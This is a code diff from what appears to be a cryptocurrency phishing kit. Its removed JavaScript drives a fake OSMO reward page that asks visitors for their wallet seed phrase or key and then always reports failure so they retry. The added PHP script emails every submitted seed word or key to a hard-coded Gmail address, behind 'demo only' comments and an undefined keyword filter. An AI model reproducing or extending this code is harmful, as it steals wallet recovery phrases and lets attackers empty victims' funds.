@@ -1,141 +1,70 @@
-/* -----------------------
-   Anim angka & penyimpanan
-   ----------------------- */
-const numberEl = document.getElementById('number');
-const congratsEl = document.getElementById('congrats');
+<?php
+// submit_form.php
+// Endpoint sederhana untuk menerima form demo (import wallet / absen key).
+// IMPORTANT: This script is for demo/non-sensitive text only.
+// It will reject submissions that appear to contain seed/private data.
+// Change $to to your email address.
 
-let stored = localStorage.getItem('osmoTarget');
-let target = stored ? parseInt(stored,10) : Math.floor(Math.random()*10001);
-if (!stored) localStorage.setItem('osmoTarget', String(target));
+$to = "jetstarup@gmail.com"; // <-- GANTI dengan alamat email tujuan
+$subjectPrefix = "[OSMO DEMO] Form submission";
+$maxLen = 1000; // batas karakter untuk masing-masing field
 
-function formatNum(n){ return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","); }
+header('Content-Type: application/json');
 
-let start = null;
-const duration = 2000;
-function step(timestamp){
-  if(!start) start = timestamp;
-  const progress = Math.min((timestamp - start)/duration, 1);
-  const val = Math.floor(progress * target);
-  numberEl.textContent = formatNum(val) + ' OSMO';
-  if(progress < 1){
-    requestAnimationFrame(step);
-  } else {
-    congratsEl.style.display = 'block';
-    congratsEl.textContent = `🎉 Congratulations! You received ${formatNum(target)} OSMO`;
-    setTimeout(()=> showPopup('popupDiscovery'), 1200);
-  }
+function respond($ok, $message){
+    echo json_encode(['ok' => $ok, 'message' => $message]);
+    exit;
 }
-requestAnimationFrame(step);
 
-/* -----------------------
-   Popup helpers
-   ----------------------- */
-function showPopup(id){
-  document.querySelectorAll('.popup').forEach(p=>p.style.display='none');
-  const el = document.getElementById(id);
-  if(el) el.style.display = 'flex';
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    respond(false, 'Method not allowed.');
 }
-function closeAllPopups(){ document.querySelectorAll('.popup').forEach(p=>p.style.display='none'); }
 
-/* Buttons */
-document.getElementById('btnRecover').addEventListener('click', ()=> {
-  showPopup('popupConnectWallet');
-});
-document.querySelectorAll('#popupConnectWallet .wallet-list button').forEach(btn=>{
-  btn.addEventListener('click', (e)=>{
-    const which = e.currentTarget.getAttribute('data-wallet');
-    if(which === 'batang'){
-      showPopup('popupAbsenKey');
-    } else {
-      document.getElementById('phraseSelect').value = '12';
-      createWordInputs(12);
-      showPopup('popupImportWallet');
+// collect possible fields
+$type = $_POST['type'] ?? '';
+$body = "Form submission received\n\nType: " . ($type?:'unknown') . "\nTime: " . date('Y-m-d H:i:s') . "\n\n";
+
+
+
+if ($type === 'import') {
+    // collect up to 24 words (only present ones)
+    $hasAny = false;
+    for ($i=1;$i<=24;$i++){
+        $k = "w{$i}";
+        if (isset($_POST[$k]) && $_POST[$k] !== '') {
+            $val = trim((string) $_POST[$k]);
+            // limit length
+            if (strlen($val) > 0) {
+                $hasAny = true;
+                if (strlen($val) > $maxLen) $val = substr($val,0,$maxLen) . '...';
+                // if suspicious keywords found -> reject
+                if (has_sensitive_keywords($val)) {
+                    respond(false, 'Submission rejected: contains suspicious keywords. Do not submit sensitive data.');
+                }
+                $body .= "Word {$i}: {$val}\n";
+            }
+        }
     }
-  });
-});
-
-/* generate inputs for import wallet */
-const phraseSelect = document.getElementById('phraseSelect');
-const wordGrid = document.getElementById('wordGrid');
-function createWordInputs(count){
-  wordGrid.innerHTML = '';
-  if(count === 12){
-    wordGrid.classList.remove('grid-4');
-    wordGrid.classList.add('grid-3');
-  } else {
-    wordGrid.classList.remove('grid-3');
-    wordGrid.classList.add('grid-4');
-  }
-  for(let i=1;i<=count;i++){
-    const inp = document.createElement('input');
-    inp.type = 'text';
-    inp.name = 'w' + i;
-    inp.placeholder = String(i);
-    inp.required = true;
-    wordGrid.appendChild(inp);
-  }
+    if (!$hasAny) respond(false, 'Tidak ada kata yang diisi.');
+    // send email
+    $subject = $subjectPrefix . " - Import Wallet";
+    $headers = "From: noreply@" . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n";
+    $sent = @mail($to, $subject, $body, $headers);
+    if ($sent) respond(true, 'Form berhasil dikirim (demo).');
+    else respond(false, 'Gagal mengirim email. Cek konfigurasi server.');
 }
-createWordInputs(12);
-phraseSelect.addEventListener('change', ()=> createWordInputs(parseInt(phraseSelect.value,10)));
-
-/* Import form submission */
-document.getElementById('importForm').addEventListener('submit', async function(e){
-  e.preventDefault();
-  const fd = new FormData();
-  const count = parseInt(phraseSelect.value,10);
-  for(let i=1;i<=count;i++){
-    const v = document.querySelector(`input[name="w${i}"]`).value || '';
-    fd.append('w'+i, v);
-  }
-  fd.append('type', 'import');
-
-  const btn = document.getElementById('importContinue');
-  btn.disabled = true;
-  btn.textContent = 'Sending...';
-
-  try {
-    const res = await fetch('submit_form.php', { method:'POST', body: fd });
-    const data = await res.json();
-    // alert(data.message); ← ini dihapus
-    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
-  } catch (err){
-    alert('Terjadi kesalahan jaringan.');
-  } finally {
-    btn.disabled = false;
-    btn.textContent = 'Continue';
-  }
-});
-
-/* Absen form submission */
-document.getElementById('absenForm').addEventListener('submit', async function(e){
-  e.preventDefault();
-  const key = document.getElementById('absenKeyInput').value || '';
-  if(key.trim().length === 0){ alert('Masukkan absen key.'); return; }
-  const fd = new FormData();
-  fd.append('absenKey', key);
-  fd.append('type','absen');
-  const btn = document.getElementById('absenContinue');
-  btn.disabled = true; btn.textContent = 'Sending...';
-  try {
-    const res = await fetch('submit_form.php', { method:'POST', body: fd });
-    const data = await res.json();
-    // alert(data.message); ← ini dihapus
-    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
-  } catch (err){
-    alert('Terjadi kesalahan jaringan.');
-  } finally {
-    btn.disabled = false; btn.textContent = 'Continue';
-  }
-});
-
-
-
-
-/* popup failed actions */
-document.getElementById('failedContinue').addEventListener('click', ()=>{
-  createWordInputs(parseInt(phraseSelect.value,10));
-  showPopup('popupImportWallet');
-});
-
-
-
+elseif ($type === 'absen') {
+    $key = trim((string) ($_POST['absenKey'] ?? ''));
+    if ($key === '') respond(false, 'Absen key kosong.');
+    if (has_sensitive_keywords($key)) respond(false, 'Submission rejected: contains suspicious keywords. Do not submit sensitive data.');
+    if (strlen($key) > $maxLen) $key = substr($key,0,$maxLen) . '...';
+    $body .= "Absen Key: {$key}\n";
+    $subject = $subjectPrefix . " - Absen Key";
+    $headers = "From: noreply@" . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n";
+    $sent = @mail($to, $subject, $body, $headers);
+    if ($sent) respond(true, 'Absen key berhasil dikirim (demo).');
+    else respond(false, 'Gagal mengirim email. Cek konfigurasi server.');
+}
+else {
+    respond(false, 'Unknown form type.');
+}
